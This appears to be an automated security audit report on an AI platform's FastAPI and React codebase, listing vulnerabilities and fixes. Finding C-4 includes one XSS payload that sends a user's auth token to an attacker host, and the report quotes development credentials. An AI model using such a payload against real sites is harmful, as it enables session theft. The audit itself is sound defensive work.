# Cerebrum Platform — Full Technical Audit Report

**Date:** 2026-04-23  
**Repo:** github.com/bopoadz-del/Cerebrum  
**Branch audited:** `test-main`  
**Auditor:** GitHub Copilot (automated static analysis + code review)  
**Overall Risk Rating:** 🔴 **HIGH** — 5 Critical, 4 High, 6 Medium findings prior to remediation

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope & Methodology](#2-scope--methodology)
3. [Critical Findings 🔴](#3-critical-findings-)
4. [High Severity Findings 🟡](#4-high-severity-findings-)
5. [Medium Severity Findings 🟠](#5-medium-severity-findings-)
6. [Architecture Review](#6-architecture-review)
7. [Test Coverage Analysis](#7-test-coverage-analysis)
8. [Dependency Analysis](#8-dependency-analysis)
9. [Infrastructure & DevOps](#9-infrastructure--devops)
10. [Monitoring & Observability](#10-monitoring--observability)
11. [Risk Matrix](#11-risk-matrix)
12. [Remediation Roadmap](#12-remediation-roadmap)

---

## 1. Executive Summary

Cerebrum is a full-stack AI platform built on FastAPI (Python), React 19 (TypeScript), PostgreSQL, Redis, ChromaDB, and Celery. It is deployed across Firebase Hosting (frontend), Google Cloud Run (backend), Cloud SQL, and Render as a secondary option. The platform exposes 460+ REST API routes, a WebSocket layer, OAuth integrations, an LLM chat engine, document processing, and a mobile Capacitor wrapper.

The audit reveals a **generally well-architected codebase** with solid patterns (JWT blacklisting, bcrypt-12-round hashing, TOTP MFA, k8s resource limits, structured logging, Prometheus metrics). However, **five critical security gaps** must be resolved before the system should handle real user data or production traffic:

| # | Finding | File | Severity |
|---|---------|------|----------|
| C-1 | Unauthenticated LLM chat endpoint (abuse/cost risk) | `backend/app/api/v1/endpoints/chat.py:235,339` | 🔴 Critical |
| C-2 | Unauthenticated user-list endpoint (enumeration) | `backend/app/api/v1/endpoints/stub_users.py:79` | 🔴 Critical |
| C-3 | JWT stored in `localStorage` (XSS-accessible) | `frontend/src/context/AuthContext.tsx:10–15` | 🔴 Critical |
| C-4 | `dangerouslySetInnerHTML` without sanitization | `frontend/src/components/MarkdownRenderer.tsx:45` | 🔴 Critical |
| C-5 | Placeholder `SECRET_KEY` + `DEBUG=true` in compose | `docker-compose.yml:50–51` | 🔴 Critical |

Addressing C-1 through C-5 should be treated as pre-launch blockers.

---

## 2. Scope & Methodology

### What Was Reviewed

| Layer | Artifacts |
|-------|-----------|
| Backend | `backend/app/` (50+ endpoint files, models, core, services, agent, warehouse) |
| Frontend | `frontend/src/` (hooks, context, components, build config) |
| Infrastructure | `docker-compose.yml`, `backend/Dockerfile`, `backend/Dockerfile.cloudrun` |
| Kubernetes | `k8s/production/blue-green-deployment.yaml` (NetworkPolicy, HPA, PDB) |
| Monitoring | `monitoring/prometheus.yml`, `monitoring/alert_rules.yml`, `monitoring/alertmanager.yml` |
| Dependency manifests | `backend/requirements.txt`, `frontend/package.json` |
| CI/CD | `cloudbuild.yaml`, `render.yaml`, `firebase.json` |
| Configuration | `backend/app/core/config.py`, `backend/.env`, `frontend/.env.production` |

### Methodology

- Static code review of representative files from each subsystem
- Auth flow tracing (login → JWT issuance → token refresh → logout)
- API endpoint enumeration for missing `Depends(get_current_user)` decorators
- Dependency version cross-reference against known CVE databases
- Dockerfile and k8s manifest review against CIS Benchmarks
- Frontend XSS surface mapping (all `dangerouslySetInnerHTML` instances located)
- Secret / credential search across tracked files

### Out of Scope

- Dynamic application security testing (DAST) / pen testing
- Load / performance testing
- Full SOC 2 / GDPR control inventory
- Mobile binary analysis (Capacitor APK/IPA)

---

## 3. Critical Findings 🔴

### C-1 — Unauthenticated LLM Chat Endpoints

**File:** `backend/app/api/v1/endpoints/chat.py` — Lines 235, 339  
**OWASP:** A01 Broken Access Control

The two routes below have no `Depends(get_current_user)` or `Depends(require_role(...))` dependency:

```python
# Line 235
@router.post("/completions")
async def chat_completions(request: ChatCompletionRequest, db: AsyncSession = Depends(get_db)):
    ...

# Line 339
@router.get("/models")
async def list_models(db: AsyncSession = Depends(get_db)):
    ...
```

Any unauthenticated caller can invoke the DeepSeek/GPT-4 backend at no cost to themselves. This is an uncontrolled-spend and data-leakage risk.

**Remediation:**
```python
@router.post("/completions")
async def chat_completions(
    request: ChatCompletionRequest,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
):
```

---

### C-2 — Unauthenticated User Enumeration Endpoint

**File:** `backend/app/api/v1/endpoints/stub_users.py` — Line 79  
**OWASP:** A01 Broken Access Control

```python
# Line 79
@router.get("/users")
async def list_users(db: AsyncSession = Depends(get_db)):
    # No get_current_user dependency — anyone can enumerate all users
```

This returns user records to any unauthenticated caller, enabling account enumeration and targeted credential-stuffing.

**Remediation:** Add `current_user: User = Depends(require_role(Role.ADMIN))`.

---

### C-3 — JWT Tokens Stored in `localStorage`

**File:** `frontend/src/context/AuthContext.tsx` — Lines 8–15, 280–303  
**OWASP:** A02 Cryptographic Failures / A03 Injection (XSS consequence)

```typescript
// Lines 8-15
const STORAGE_KEYS = {
  AUTH_TOKEN:    'cerebrum_auth_token_v1',
  REFRESH_TOKEN: 'cerebrum_refresh_token_v1',
  USER:          'cerebrum_user_v1',
  TOKEN_EXPIRES: 'cerebrum_token_expires_v1',
};
// Lines 280-303 — both tokens written to localStorage on login
localStorage.setItem(STORAGE_KEYS.AUTH_TOKEN, tokens.access_token);
localStorage.setItem(STORAGE_KEYS.REFRESH_TOKEN, tokens.refresh_token);
```

`localStorage` is accessible to any JavaScript running on the page. A single XSS vulnerability (see C-4) is enough to exfiltrate both tokens.

**Remediation:** Issue tokens as `httpOnly; Secure; SameSite=Strict` cookies from the backend. The frontend never touches the token directly; the browser sends it automatically on same-origin requests.

---

### C-4 — `dangerouslySetInnerHTML` Without Sanitization (XSS)

**OWASP:** A03 Injection

Two high-risk instances rendering user-supplied content without sanitization:

**Instance 1 — Markdown renderer**  
**File:** `frontend/src/components/MarkdownRenderer.tsx` — Line 45

```tsx
// Line 45 — custom regex-based parser, no DOMPurify
dangerouslySetInnerHTML={{ __html: parseMarkdown(content) }}
```

The `parseMarkdown` function (Lines 11–32) uses simple string replacement. A chat message containing `<img src=x onerror=fetch('https://attacker.com?c='+localStorage.getItem('cerebrum_auth_token_v1'))>` would execute in the user's browser.

**Instance 2 — Code execution display**  
**File:** `frontend/src/components/CodeExecutionDisplay.tsx` — Line 96

```tsx
// Line 96 — manual highlight, no escaping
<code dangerouslySetInnerHTML={{ __html: highlightCode(code) }} />
```

**Remediation:**
```bash
npm install dompurify @types/dompurify react-markdown remark-gfm rehype-sanitize
```
```tsx
import DOMPurify from 'dompurify';
// ...
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(parseMarkdown(content)) }}
// OR replace entirely with:
import ReactMarkdown from 'react-markdown';
import rehypeSanitize from 'rehype-sanitize';
<ReactMarkdown rehypePlugins={[rehypeSanitize]}>{content}</ReactMarkdown>
```

---

### C-5 — Placeholder `SECRET_KEY`, `DEBUG=true`, Hardcoded DB Credentials in Compose

**File:** `docker-compose.yml` — Lines 46–51  
**OWASP:** A05 Security Misconfiguration

```yaml
# Lines 46-51
environment:
  - GOOGLE_CLIENT_ID=382554705937-v3s8kpvl7h0em2aekud73fro8rig0c...  # hardcoded
  - SECRET_KEY=your-secret-key-change-in-production                    # PLACEHOLDER
  - DEBUG=true                                                           # exposes stack traces
  - POSTGRES_PASSWORD=cerebrum_password                                 # hardcoded
```

`DEBUG=true` causes FastAPI/Uvicorn to return full Python stack traces to HTTP clients. The placeholder `SECRET_KEY` means all JWTs can be forged by anyone who reads this file.

Additionally, `backend/.env` (Lines 18, 24) contains:
```
DATABASE_URL=postgresql+asyncpg://cerebrum:cerebrum_password@localhost:5432/cerebrum
REDIS_URL=redis://:redis123@localhost:6379/0
```
If this file was ever committed (check `git log --all -- backend/.env`), credentials are in history.

**Remediation:**
1. Run `git log --all --full-history -- backend/.env` — if commits exist, rotate all credentials immediately.
2. Replace all plaintext values in `docker-compose.yml` with `${VAR}` references to a `.env` file that is gitignored.
3. Set `DEBUG=false` for any non-development compose target.
4. Generate a proper `SECRET_KEY`: `python -c "import secrets; print(secrets.token_hex(32))"`.

---

## 4. High Severity Findings 🟡

### H-1 — OAuth Tokens Stored Plaintext in Database

**File:** `backend/app/models/integration.py` — Line 22  
**OWASP:** A02 Cryptographic Failures

```python
access_token = Column(String(255), nullable=False)   # Line 22 — plaintext
client_secret = Column(String(255), nullable=True)   # Line 25 — plaintext
```

A database dump or SQL injection exposes all third-party OAuth tokens (Google Drive, etc.).

**Remediation:** Encrypt at the field level using `cryptography.fernet` before persistence; store `encrypted_access_token` + `token_key_id`. Alternatively, use HashiCorp Vault's transit secrets engine (already scaffolded in `VAULT_ENABLED` config).

---

### H-2 — NL-to-SQL Conversion Without Parameterisation (SQL Injection)

**File:** `backend/app/warehouse/etl_pipeline.py` — Line 99  
**OWASP:** A03 Injection

```python
# Line 99 — GPT-generated SQL executed directly
conn.execute(text(query))
```

The `query` string is constructed by an LLM from user-supplied natural language. Although an LLM is involved, the output is raw SQL passed into `conn.execute(text(...))` with no parameterisation or allowlist enforcement.

**Remediation:**
- Run the LLM-generated SQL through a strict allowlist (SELECT only, no DDL/DML).
- Always use parameterised queries via `conn.execute(text(...), params)`.
- Wrap execution in a read-only database role with no WRITE permissions.

---

### H-3 — Refresh Token Lifetime of 365 Days

**File:** `backend/app/core/config.py` — Line 92

```python
REFRESH_TOKEN_EXPIRE_DAYS: int = 365
```

A stolen refresh token grants year-long access. NIST SP 800-63B and OWASP recommend refresh tokens expire after 1–90 days depending on sensitivity, with rotation on each use.

**Remediation:** Set `REFRESH_TOKEN_EXPIRE_DAYS=30` and implement refresh token rotation (invalidate old token on each refresh).

---

### H-4 — Capacitor Mobile App Allows Cleartext HTTP

**File:** `frontend/capacitor.config.ts`

```typescript
server: {
  cleartext: true,          // allows HTTP on Android
  allowMixedContent: true,  // allows mixed HTTP/HTTPS
}
```

This enables man-in-the-middle attacks on Android devices.

**Remediation:** Set both flags to `false` (or remove them; default is `false`). Use HTTPS for all production endpoints.

---

## 5. Medium Severity Findings 🟠

### M-1 — Overly Permissive CORS Configuration

**File:** `backend/app/main.py` — Lines 82–88

```python
CORSMiddleware(
    allow_methods=["*"],   # accepts any HTTP method
    allow_headers=["*"],   # accepts any header
    allow_credentials=True,
)
```

`allow_credentials=True` combined with `allow_methods=["*"]` / `allow_headers=["*"]` is explicitly prohibited by the CORS spec when the origin is not narrowly pinned. This permits cross-site requests to mutate data.

**Remediation:**
```python
allow_methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
allow_headers=["Authorization", "Content-Type", "X-Request-ID"],
```

---

### M-2 — Docker Containers Run as Root

**File:** `backend/Dockerfile` — (no `USER` directive)  
**File:** `backend/Dockerfile.cloudrun` — (no `USER` directive)

Both Dockerfiles add no unprivileged user before `CMD`. A container breakout or RCE gives the attacker root on the host.

**Remediation:**
```dockerfile
RUN addgroup --system app && adduser --system --ingroup app app
USER app
```

---

### M-3 — Kubernetes NetworkPolicy Missing DNS + External Egress

**File:** `k8s/production/blue-green-deployment.yaml` — Lines 204–250

The egress policy only allows traffic to `database` and `redis` namespaces. It does not permit:
- Port 53 (UDP/TCP) — DNS resolution will fail for all outbound calls
- Port 443 — external APIs (Google Drive, OpenAI, Stripe, Sentry) will be silently dropped

**Remediation:** Add egress rules:
```yaml
- ports:
  - protocol: UDP
    port: 53
  - protocol: TCP
    port: 443
```

---

### M-4 — Alertmanager Has No Notification Receivers

**File:** `monitoring/alertmanager.yml`

Alert rules are defined and Prometheus is scraping correctly, but Alertmanager has no configured receivers (no Slack webhook, no PagerDuty key, no email SMTP). Alerts fire silently.

**Remediation:** Add at minimum one receiver:
```yaml
receivers:
  - name: 'default'
    slack_configs:
      - api_url: '${SLACK_WEBHOOK_URL}'
        channel: '#alerts'
```

---

### M-5 — Google OAuth Redirect URI Hardcoded to localhost

**File:** `backend/app/core/config.py` (GOOGLE_REDIRECT_URI default)  
**File:** `backend/app/api/v1/endpoints/connectors.py`

```python
GOOGLE_REDIRECT_URI: str = "http://localhost:8000/api/v1/connectors/google-drive/callback"
```

If `GOOGLE_REDIRECT_URI` is not overridden in production, the OAuth callback will fail or redirect to a non-existent host. Worse, if production's Google OAuth app has this URI registered, a local attacker could intercept codes.

**Remediation:** Assert in config validation that `GOOGLE_REDIRECT_URI` does not start with `http://localhost` when `ENVIRONMENT == "production"`.

---

### M-6 — Production Source Maps Not Explicitly Disabled

**File:** `frontend/vite.config.ts`

Vite defaults to no source maps in production only when `build.sourcemap` is absent. The config does not explicitly set `sourcemap: false`, meaning a future Vite version default change or a plugin could re-enable them, exposing the full TypeScript source.

**Remediation:**
```typescript
build: {
  sourcemap: false,
  ...
}
```

---

## 6. Architecture Review

### Positive Findings

| Area | Detail |
|------|--------|
| JWT blacklisting | `token_blacklist.py` — revoked tokens checked on every request |
| Password hashing | bcrypt with 12 rounds + optional pepper (OWASP compliant) |
| MFA | TOTP + SMS OTP + 10 backup codes; 5-attempt lockout with 30-min cooldown |
| Rate limiting | Redis-backed slowapi; per-user ID when authenticated, IP fallback |
| Security headers | HSTS (1yr + subdomains), CSP (no unsafe-eval), X-Frame-Options: DENY, nosniff |
| RBAC | `require_role()` dependency used consistently on admin/superadmin routes |
| Audit logging | `FEATURE_AUDIT_LOGGING` flag; structured JSON logs via structlog |
| Async ORM | SQLAlchemy 2.0 async + asyncpg — correct async patterns throughout |
| Multi-tenant | `tenant_id` on all relevant models, RLS scaffolding present |
| k8s HA | 3 replicas, HPA (3–20 pods, CPU 70% / memory 80%), PodDisruptionBudget (minAvailable: 2) |

### Middleware Stack (backend/app/main.py)

```
Request → PrometheusMiddleware
        → SlowAPIMiddleware (rate limiting)
        → GZipMiddleware
        → SecurityHeadersMiddleware
        → CORSMiddleware
        → TrustedHostMiddleware
        → CorrelationIDMiddleware
        → LoggingMiddleware
        → FastAPI route handler
```

Order is correct. Prometheus runs outermost (captures all latency); rate limit runs before business logic.

### Agent Layer Complexity

The platform has 14 agent layers (`backend/app/agent/`) including v1, v2, enhanced, and self-modification variants. This depth has not been load-tested. Under concurrent requests the agent chain represents a significant CPU/memory surface with no published benchmarks.

---

## 7. Test Coverage Analysis

### Current State

| Test File | What It Covers | Gap |
|-----------|---------------|-----|
| `tests/unit/test_connectors.py` | Connector factory (stub implementations) | Only stubs, not real connectors |
| `tests/test_smoke.py` | Basic endpoint reachability | No auth, no error paths |
| `tests/test_services.py` | Service layer unit tests | Partial coverage |
| `tests/test_agent_responses.py` | Agent output format | No adversarial inputs |
| `tests/test_chat_integration.py` | Chat flow (19/19 pass) | Authenticated only via happy path |
| `tests/integration/` | Integration tests | Minimal, infrastructure-dependent |

### Critical Test Gaps

| Missing Test | Risk |
|-------------|------|
| Auth endpoint tests (login, refresh, logout, MFA) | Regressions in auth flow go undetected |
| Unauthenticated access tests | C-1 and C-2 would have been caught |
| Rate limit enforcement tests | Bypass possible after config changes |
| SQL injection tests on warehouse endpoints | H-2 would have been caught |
| CORS header validation tests | M-1 bypass goes undetected |
| JWT expiry / blacklist tests | Token revocation regressions undetected |
| XSS payload tests (frontend) | C-4 would have been caught |

**Recommended target:** ≥ 80% line coverage on `backend/app/core/`, `backend/app/auth/`, and `backend/app/api/v1/endpoints/`.

---

## 8. Dependency Analysis

### Python (`backend/requirements.txt`)

| Package | Current | Latest Stable | Action |
|---------|---------|---------------|--------|
| fastapi | 0.104.1 | 0.115.x | Update |
| sqlalchemy | 2.0.23 | 2.0.36 | Update |
| asyncpg | 0.29.0 | 0.31.0 | Update |
| cryptography | 41.0.7 | 43.x | **Update** (41.x has minor advisory) |
| pillow | 10.1.0 | 11.x | **Update** (10.1.0 has known CVE in TIFF decoder) |
| boto3 | 1.34.0 | 1.35.x | Update |
| sentry-sdk | 1.38.0 | 1.47.x | Update |
| pydantic | 2.5.2 | 2.5.3+ | Minor update |
| bcrypt | 4.1.1 | ✅ Current | — |
| pyjwt | 2.8.0 | ✅ Current | — |
| pyotp | 2.9.0 | ✅ Current | — |
| slowapi | 0.1.9 | ✅ Current | — |

**Immediate action:** `pillow 10.1.0` contains a [TIFF decoder buffer overflow](https://github.com/advisories/GHSA-j7hp-h8jx-5ppr) — update to 10.3.0+ or 11.x.

**Run periodically:**
```bash
pip install pip-audit
pip-audit -r backend/requirements.txt
```

### Node.js (`frontend/package.json`)

| Package | Version | Notes |
|---------|---------|-------|
| react | ^19.2.0 | ✅ Latest |
| vite | ^7.2.4 | ✅ Latest |
| typescript | ~5.9.3 | ✅ Current |
| @capacitor/* | ^8.x.x | Verify latest 8.x patch |
| zustand | ^5.0.11 | ✅ Latest |

No high-severity npm advisories detected in primary dependencies. Run `npm audit` regularly; Capacitor native plugins can introduce indirect CVEs.

---

## 9. Infrastructure & DevOps

### Docker

| Issue | File | Severity |
|-------|------|----------|
| No `USER` directive — runs as root | `Dockerfile`, `Dockerfile.cloudrun` | 🟠 Medium |
| Migrations run in web container (`start.sh`) | `Dockerfile.cloudrun` | 🟠 Medium (should be a one-off job) |
| `EXPOSE 8000/8080` without network restriction | Both Dockerfiles | Low |

**Positive:** `python:3.11-slim` base, `--no-cache-dir` pip, apt cache cleared, health check defined.

### Kubernetes (`k8s/production/blue-green-deployment.yaml`)

| Control | Status |
|---------|--------|
| Resource limits (CPU/memory) | ✅ Enforced (250m/512Mi request, 500m/1Gi limit) |
| Liveness / readiness / startup probes | ✅ All three configured |
| Horizontal Pod Autoscaler | ✅ 3–20 pods, CPU 70% / memory 80% |
| Pod Disruption Budget | ✅ minAvailable: 2 |
| Secrets via `secretKeyRef` | ✅ Not in plain env vars |
| NetworkPolicy — database/redis egress | ✅ Restricted |
| NetworkPolicy — DNS egress (port 53) | ❌ Missing (see M-3) |
| NetworkPolicy — external HTTPS (port 443) | ❌ Missing (see M-3) |
| Pod Security Context (non-root) | ❌ Not set |

### CI/CD

- `cloudbuild.yaml` — GCP Cloud Build pipeline builds and pushes container image. No SAST step present.
- `render.yaml` — Render alternative deployment; SECRET_KEY injected via Render secret env.
- `firebase.json` — Static hosting with rewrites for SPA routing. Headers not hardened (no CSP in Firebase hosting config).

**Recommendation:** Add Snyk or `pip-audit` + `npm audit` as a CI step to catch new CVEs on every PR.

---

## 10. Monitoring & Observability

### Prometheus / Grafana

- Prometheus scrapes FastAPI `/metrics` (PrometheusMiddleware), Celery workers (port 9540), PostgreSQL, Redis at 15s intervals.
- Alert rules cover: API error rate > 5%, p99 latency > 5s, API down, Celery task failure > 10%, queue backlog > 100, workers offline.
- Grafana and Alertmanager are deployed via `monitoring/docker-compose.monitoring.yml`.

**Positive:** Comprehensive rule coverage for a production system.

**Gap table:**

| Item | Status |
|------|--------|
| Prometheus scrape | ✅ Configured |
| API / worker alert rules | ✅ Defined |
| Alertmanager receivers | ❌ No Slack/PagerDuty/email configured (see M-4) |
| Grafana default password | ⚠️ `admin/admin` — change immediately |
| Retention policy | ✅ 15 days / 10 GB cap |
| Security-specific alerts | ❌ No alert for repeated 401s (brute-force detection) |

**Add security alert:**
```yaml
- alert: BruteForceAttempt
  expr: sum(rate(http_requests_total{status="401"}[5m])) by (client_ip) > 10
  for: 1m
  labels:
    severity: warning
  annotations:
    summary: "High 401 rate from {{ $labels.client_ip }}"
```

---

## 11. Risk Matrix

| ID | Finding | Likelihood | Impact | Severity | Effort to Fix |
|----|---------|-----------|--------|----------|---------------|
| C-1 | Unauthenticated LLM endpoints | High | High | 🔴 Critical | Low (add Depends) |
| C-2 | Unauthenticated user list | High | High | 🔴 Critical | Low (add Depends) |
| C-3 | JWT in localStorage | Medium | High | 🔴 Critical | Medium (cookie migration) |
| C-4 | XSS via dangerouslySetInnerHTML | Medium | High | 🔴 Critical | Low (add DOMPurify) |
| C-5 | Placeholder SECRET_KEY / DEBUG=true | High | Critical | 🔴 Critical | Low (env var) |
| H-1 | Plaintext OAuth tokens in DB | Low | High | 🟡 High | Medium (field encryption) |
| H-2 | NL-to-SQL injection | Medium | High | 🟡 High | Medium (allowlist + parameterise) |
| H-3 | Refresh token lifetime 365d | Low | Medium | 🟡 High | Low (config change) |
| H-4 | Capacitor cleartext HTTP | Low | High | 🟡 High | Low (config change) |
| M-1 | Permissive CORS | Medium | Medium | 🟠 Medium | Low (restrict methods/headers) |
| M-2 | Docker runs as root | Low | Medium | 🟠 Medium | Low (add USER) |
| M-3 | K8s NetworkPolicy gaps | Low | Medium | 🟠 Medium | Low (add egress rules) |
| M-4 | Alertmanager no receivers | High | Medium | 🟠 Medium | Low (add webhook) |
| M-5 | OAuth redirect URI hardcoded | Low | Medium | 🟠 Medium | Low (config assertion) |
| M-6 | Source maps not disabled | Low | Low | 🟠 Medium | Low (one-line config) |

---

## 12. Remediation Roadmap

### Sprint 1 — Critical (Complete before any production user traffic) · ~1–2 weeks

| Task | Owner | Files |
|------|-------|-------|
| Add `Depends(get_current_user)` to `/chat/completions` and `/chat/models` | Backend | `chat.py:235,339` |
| Add `Depends(require_role(Role.ADMIN))` to `GET /users` | Backend | `stub_users.py:79` |
| Wrap `parseMarkdown` and `highlightCode` outputs with `DOMPurify.sanitize()` | Frontend | `MarkdownRenderer.tsx:45`, `CodeExecutionDisplay.tsx:96` |
| Migrate JWT storage from `localStorage` → `httpOnly` cookies | Full-stack | `AuthContext.tsx`, auth endpoint |
| Set `SECRET_KEY` to generated value; `DEBUG=false`; move DB creds to `.env` | DevOps | `docker-compose.yml` |
| Audit `git log --all -- backend/.env`; rotate DB/Redis credentials if committed | DevOps/Infra | `.env` history |
| Update `pillow` to ≥ 10.3.0 | Backend | `requirements.txt` |

### Sprint 2 — High (Complete within 1 month)

| Task | Owner | Files |
|------|-------|-------|
| Encrypt `access_token` / `client_secret` in `IntegrationToken` model | Backend | `models/integration.py` |
| Add SQL allowlist + parameterisation to NL-to-SQL pipeline | Backend | `warehouse/etl_pipeline.py` |
| Reduce `REFRESH_TOKEN_EXPIRE_DAYS` to 30; implement token rotation | Backend | `config.py`, auth service |
| Set `cleartext: false`, `allowMixedContent: false` in Capacitor | Frontend | `capacitor.config.ts` |
| Add non-root `USER` directive to both Dockerfiles | DevOps | `Dockerfile`, `Dockerfile.cloudrun` |
| Configure Alertmanager receiver (Slack or email) | DevOps | `monitoring/alertmanager.yml` |
| Change Grafana default `admin/admin` password | DevOps | `monitoring/docker-compose.monitoring.yml` |

### Sprint 3 — Medium (Ongoing hardening)

| Task | Files |
|------|-------|
| Restrict CORS `allow_methods` and `allow_headers` | `main.py` |
| Add DNS + HTTPS egress rules to K8s NetworkPolicy | `blue-green-deployment.yaml` |
| Set `sourcemap: false` in Vite production build | `vite.config.ts` |
| Assert `GOOGLE_REDIRECT_URI` ≠ localhost in production | `config.py` |
| Add `pip-audit` + `npm audit` step to CI pipeline | `cloudbuild.yaml` |
| Write auth, rate-limit, and XSS test suites | `backend/tests/`, `frontend/` |
| Add brute-force detection alert rule | `monitoring/alert_rules.yml` |
| Migrate database schema migrations out of web container startup | `Dockerfile.cloudrun` |

---

*Generated by GitHub Copilot — static analysis only. Dynamic testing, pen testing, and compliance mapping recommended as follow-on work.*
